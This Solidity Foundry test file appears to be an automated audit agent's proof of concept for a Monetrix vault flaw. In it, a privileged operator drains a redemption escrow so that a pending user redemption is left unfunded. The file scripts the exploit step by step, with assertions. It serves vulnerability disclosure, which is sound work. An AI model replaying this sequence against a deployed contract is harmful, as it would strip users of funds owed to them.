// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/ActionEncoderBoundCheck.t.sol";
import "../src/core/MonetrixVault.sol";
import "../src/core/RedeemEscrow.sol";
import "../src/tokens/USDM.sol";

// ATTACK TIMELINE:
// 1. [Setup] User1 deposits 10,000 USDC and requests a redemption.
// 2. [T=0] Operator over-funds the RedeemEscrow with 20,000 USDC via fundRedemptions().
//           RedeemEscrow balance = 20,000, totalOwed = 10,000.
// 3. [T=1] User1 claims their redemption. RedeemEscrow pays out 10,000 USDC.
//           RedeemEscrow balance = 10,000, totalOwed = 0.
// 4. [T=2] User2 deposits 10,000 USDC and requests a redemption.
//           Vault now has a pending redeem request for User2, but RedeemEscrow totalOwed is still 0.
// 5. [T=3] Malicious operator calls reclaimFromRedeemEscrow(10,000) to pull the "excess" USDC back to the Vault.
//           RedeemEscrow check passes: bal(10,000) >= amount(10,000) + totalOwed(0).
// 6. [Assert] RedeemEscrow balance is 0, but Vault still has an unfunded pending redemption queue for User2.
//             This proves the cross-contract assumption mismatch where RedeemEscrow is drained of funds needed for imminent claims.

contract AuditAgentPoC is ToL1WeiHarness {
    function test_exploit() public {
        // Step 1: User1 deposits and requests redeem
        _depositAs(user1, 10_000e6);

        vm.startPrank(user1);
        usdm.approve(address(vault), 10_000e6);
        uint256 reqId1 = vault.requestRedeem(10_000e6);
        vm.stopPrank();

        // Step 2: Operator over-funds the RedeemEscrow
        // We deal extra USDC to the vault to allow over-funding
        deal(address(usdc), address(vault), 20_000e6);

        vm.prank(operator);
        vault.fundRedemptions(20_000e6);

        console.log("Step 2: Escrow balance =", redeemEscrow.balance());
        console.log("Step 2: Escrow totalOwed =", redeemEscrow.totalOwed());

        // Step 3: User1 claims their redemption
        vm.warp(block.timestamp + 3 days);
        vm.prank(user1);
        vault.claimRedeem(reqId1);

        console.log("Step 3: Escrow balance after claim =", redeemEscrow.balance());
        console.log("Step 3: Escrow totalOwed after claim =", redeemEscrow.totalOwed());

        // Step 4: User2 deposits and requests redeem
        _depositAs(user2, 10_000e6);

        vm.startPrank(user2);
        usdm.approve(address(vault), 10_000e6);
        uint256 reqId2 = vault.requestRedeem(10_000e6);
        vm.stopPrank();

        uint256 vaultBalBefore = usdc.balanceOf(address(vault));
        uint256 escrowBalBefore = redeemEscrow.balance();

        // Step 5: Malicious operator reclaims the "excess" USDC from RedeemEscrow
        // The check in reclaimTo is: bal >= amount + totalOwed
        // 10,000 >= 10,000 + 0 -> Passes!
        vm.prank(operator);
        vault.reclaimFromRedeemEscrow(10_000e6);

        uint256 vaultBalAfter = usdc.balanceOf(address(vault));
        uint256 escrowBalAfter = redeemEscrow.balance();

        console.log("Step 5: Vault balance after reclaim =", vaultBalAfter);
        console.log("Step 5: Escrow balance after reclaim =", escrowBalAfter);

        // Step 6: Assertions
        // The operator successfully drained the escrow
        assertEq(escrowBalAfter, 0, "Escrow should be drained to 0");
        assertGt(vaultBalAfter, vaultBalBefore, "Vault should have received the reclaimed USDC");

        // The critical vulnerability: User2 has a pending redeem request in the Vault,
        // but the RedeemEscrow has 0 balance and 0 totalOwed. If the operator bridges
        // the USDC away from the Vault, User2's redemption is completely unfunded and
        // the RedeemEscrow has no knowledge of the obligation.
        assertEq(redeemEscrow.totalOwed(), 0, "totalOwed diverges from actual pending Vault redemptions");
        assertGt(escrowBalBefore, escrowBalAfter, "Escrow lost funds needed for imminent claims");
    }
}
